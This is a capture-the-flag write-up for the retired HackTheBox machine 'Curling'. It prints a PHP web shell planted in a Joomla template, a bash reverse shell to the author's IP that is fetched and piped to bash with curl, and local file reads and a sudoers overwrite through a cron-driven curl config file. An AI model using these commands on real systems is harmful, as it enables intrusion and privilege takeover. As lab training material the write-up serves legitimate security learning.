# Curling

This is the write-up for the box Curling that got retired at the 30th March 2019.
My IP address was 10.10.14.24 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.150    curling.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/curling.nmap 10.10.10.150
```

```markdown
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

On the web page is a blog with the title _"Cewl Curling Site"_ that runs on **Joomla** and there is a login form on the right side.

The article with the title _"My first post of curling in 2018"_ is signed by _Floris_ and the header says _"Written by Super User"_ so those could be potential usernames.
The blog title could be a hint to use the custom wordlist generator tool **CeWL** to search for potential credentials.

Such a custom wordlist can be generated with **CeWL**:
```markdown
cewl -w curling_cewl.txt 10.10.10.150
```

When looking at the HTML source code of the homepage, there is a comment in the last line that says _secret.txt_.
This file is accessible by browsing to it:
```markdown
http://10.10.10.150/secret.txt
```

The content is one string:
> Q3VybGluZzIwMTgh

This string looks like a password, when it gets **Base64-decoded**:
```markdown
echo 'Q3VybGluZzIwMTgh' | base64 -d
```

> Curling2018!

After trying out the username _floris_ and this password, the login on the page is successful.
These credentials also work on the **Joomla** backend at _/administrator_.

### Getting command execution

To get command execution on **Joomla** and start a reverse shell, we try to modify the templates or create a new file to inject PHP code.
```markdown
Extensions --> Templates --> Templates --> Protostar Details and Files --> New File
```

Content of own PHP file _(shell.php)_:
```markdown
<?php system($_REQUEST['cmd']); ?>
```

This file can be found in _/templates/protostar/shell.php_ and it is possible to execute commands:
```markdown
http://10.10.10.150/templates/protostar/shell.php?cmd=whoami
```

The output of the `whoami` command is _www-data_. Lets start a reverse shell on the box, by creating a bash script that will get downloaded and executed by the box:

Creating _shell.sh_
```markdown
bash -i >& /dev/tcp/10.10.14.24/9001 0>&1
```

Downloading and executing file:
```markdown
http://10.10.10.150/templates/protostar/shell.php?cmd=curl%2010.10.14.24/shell.sh%20|%20bash
```

After sending this request, the listener on my IP and port 9001 starts a reverse shell session as _www-data_.

## Privilege Escalation

In the home directory _/home/floris_ is a file called _password_backup_.
This file is in hexdump format, that can be reversed with `xxd`:
```markdown
xxd -r password_backup > password_backup.1
```

It is non-human readable text and `file password_backup.1` shows that it is **bzip compresssed data**:
```markdown
bzcat password_backup.1 > password_backup.2
```

It is still not readable and `file password_backup.2` shows that it is **gzip compressed data**:
```markdown
zcat password_backup.2 > password_backup.3
```

It is still not readable and `file password_backup.3` shows that it is **bzip compressed data**:
```markdown
zcat password_backup.3 > password_backup.4
```

It is now almost readable and `file password_backup.4` shows that it is a **POSIX tar archive**:
```markdown
tar -xvf password_backup.4
```

It extracts the file _password.txt_ with the following content:
```markdown
5d<wdCbdZu)|hChXll
```

> TIP: All of this can also be automated with **CyberChef** and [here is the recipe](https://gchq.github.io/CyberChef/#recipe=From_Hexdump()Bzip2_Decompress(false)Gunzip()Bzip2_Decompress(false)Untar()&input=MDAwMDAwMDA6IDQyNWEgNjgzOSAzMTQxIDU5MjYgNTM1OSA4MTliIGJiNDggMDAwMCAgQlpoOTFBWSZTWS4uLkguLgowMDAwMDAxMDogMTdmZiBmZmZjIDQxY2YgMDVmOSA1MDI5IDYxNzYgNjFjYyAzYTM0ICAuLi4uQS4uLlApYXZhLjo0CjAwMDAwMDIwOiA0ZWRjIGNjY2MgNmUxMSA1NDAwIDIzYWIgNDAyNSBmODAyIDE5NjAgIE4uLi5uLlQuIy5AJS4uLmAKMDAwMDAwMzA6IDIwMTggMGNhMCAwMDkyIDFjN2EgODM0MCAwMDAwIDAwMDAgMDAwMCAgIC4uLi4uLnouQC4uLi4uLgowMDAwMDA0MDogMDY4MCA2OTg4IDM0NjggNjQ2OSA4OWE2IGQ0MzkgZWE2OCBjODAwICAuLmkuNGhkaS4uLjkuaC4uCjAwMDAwMDUwOiAwMDBmIDUxYTAgMDA2NCA2ODFhIDA2OWUgYTE5MCAwMDAwIDAwMzQgIC4uUS4uZGguLi4uLi4uLjQKMDAwMDAwNjA6IDY5MDAgMDc4MSAzNTAxIDZlMTggYzJkNyA4Yzk4IDg3NGEgMTNhMCAgaS4uLjUubi4uLi4uLkouLgowMDAwMDA3MDogMDg2OCBhZTE5IGMwMmEgYjBjMSA3ZDc5IDJlYzIgM2M3ZSA5ZDc4ICAuaC4uLiouLn15Li48fi54CjAwMDAwMDgwOiBmNTNlIDA4MDkgZjA3MyA1NjU0IGMyN2EgNDg4NiBkZmEyIGU5MzEgIC4%2BLi4uc1ZULnpILi4uLjEKMDAwMDAwOTA6IGM4NTYgOTIxYiAxMjIxIDMzODUgNjA0NiBhMmRkIGMxNzMgMGQyMiAgLlYuLi4hMy5gRi4uLnMuIgowMDAwMDBhMDogYjk5NiA2ZWQ0IDBjZGIgODczNyA2YTNhIDU4ZWEgNjQxMSA1MjkwICAuLm4uLi4uN2o6WC5kLlIuCjAwMDAwMGIwOiBhZDZiIGIxMmYgMDgxMyA4MTIwIDgyMDUgYTVmNSAyOTcwIGM1MDMgIC5rLi8uLi4gLi4uLilwLi4KMDAwMDAwYzA6IDM3ZGIgYWIzYiBlMDAwIGVmODUgZjQzOSBhNDE0IDg4NTAgMTg0MyAgNy4uOy4uLi4uOS4uLlAuQwowMDAwMDBkMDogODI1OSBiZTUwIDA5ODYgMWU0OCA0MmQ1IDEzZWEgMWMyYSAwOThjICAuWS5QLi4uSEIuLi4uKi4uCjAwMDAwMGUwOiA4YTQ3IGFiMWQgMjBhNyA1NTQwIDcyZmYgMTc3MiA0NTM4IDUwOTAgIC5HLi4gLlVAci4uckU4UC4KMDAwMDAwZjA6IDgxOWIgYmI0OA) for this case.

As the content doesn't look like any type of encoding, just use it as it is on SSH:
```markdown
ssh floris@10.10.10.150
```

### Privilege Escalation to root

In the home directory _/home/floris_ is a directory _/admin-area_ with two files.
- report
- input

The contents of the file _report_ is the HTML source of the initial web page and the content of _input_ is one line:
```markdown
url = "http://127.0.0.1"
```

Lets change this to our client and check if it tries to connect to us:
```markdown
url = "http://10.10.14.24/test"
```

After a while it connects to our client and rewrites _report_ to the failed request and changes _input_ back to the original state.
This probably uses a `curl` command and with that information it is possible to also read local files:
```markdown
url = "file:///etc/passwd"
```

This writes the contents of _/etc/passwd_ into the _report_ file.
As this is most likely a **Cronjob**, it is possible to read the Crontab of root:
```markdown
url = "file:///var/spool/cron/crontabs/root"
```

After the next cycle, it shows the results:
```markdown
* * * * * curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
```

> TIP: The _report_ file can be continuously checked with `watch -n 1 cat report` as it gets rewritten after every minute.

In `curl` the _-K_ parameter uses a configuration file, so we can change the configuration that it downloads a file from our local client and rewrites a sensitive file on the box like the _sudoers_ file.

Modifying _input_:
```markdown
url = "http://10.10.14.24/sudoers"
output = "/etc/sudoers"
user-agent = "whateveragent/1.0
```

This will download my _sudoers_ file with the all permission for _floris_ and rewrite _/etc/sudoers_ on the box:
```markdown
root    ALL=(ALL:ALL) ALL
floris  ALL=(ALL:ALL) ALL
```

Now it is possible to change user to root with `sudo su -` and the password of _floris_!
